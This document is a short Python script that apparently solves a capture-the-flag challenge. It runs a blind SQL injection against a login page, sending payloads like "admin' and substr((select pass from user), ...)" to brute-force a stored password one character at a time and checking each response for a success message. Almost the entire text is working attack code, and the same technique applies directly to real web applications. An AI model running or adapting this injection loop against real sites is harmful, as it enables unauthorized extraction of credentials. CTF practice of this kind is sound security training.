## This script is slow. Took me more than hour to get the flag.

import urllib
import urllib2

url = 'http://ctfq.sweetduet.info:10080/~q6/index.php'

## I already know that the first five characters of flag is "FLAG_"
## So start with 6th characters

offset = 6
flag = ''
code = 33

while len(flag) < 16:
	data = urllib.urlencode({"id":"admin' and substr((select pass from user), " + str(offset) + ", 1) = " + chr(39) + chr(code) + chr(39) + " --"})
	req = urllib2.Request(url, data)
	res = urllib2.urlopen(req)
	response = res.read()
	if 'Congratulations!' in response:
		flag += chr(code)
		offset += 1
		code = 33 ## Reset ascii. Back to the beginning
		print('Progress: ' + str(flag))
	else:
		code += 1
		
print('Flag is: FLAG_' + str(flag))